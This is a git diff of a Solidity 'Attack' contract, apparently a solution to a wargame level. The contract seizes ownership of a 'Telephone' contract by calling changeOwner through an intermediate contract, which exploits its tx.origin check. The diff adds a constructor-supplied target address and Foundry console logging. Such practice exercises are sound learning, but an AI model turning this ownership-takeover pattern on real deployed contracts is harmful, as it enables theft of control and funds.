@@ -1,15 +1,21 @@
 pragma solidity ^0.8.0;
 
 import "./Telephone.sol";
+import "forge-std/console.sol";
 
 contract Attack {
-    Telephone public telephone;
+    address public telephoneAddress;
 
-    constructor() {
-        telephone = Telephone(0x45298B3FDb63De443F8B3aE0Ce2816285c5d2Ed1);
+    constructor(address _telephoneAddress) {
+        telephoneAddress = _telephoneAddress;
     }
 
     function attack() public {
+        console.log("start attack() in Attack");
+        console.log("tx.origin : %s", tx.origin);
+        console.log("msg.sender : %s", msg.sender);
+
+        Telephone telephone = Telephone(telephoneAddress);
         telephone.changeOwner(msg.sender);
     }
 }
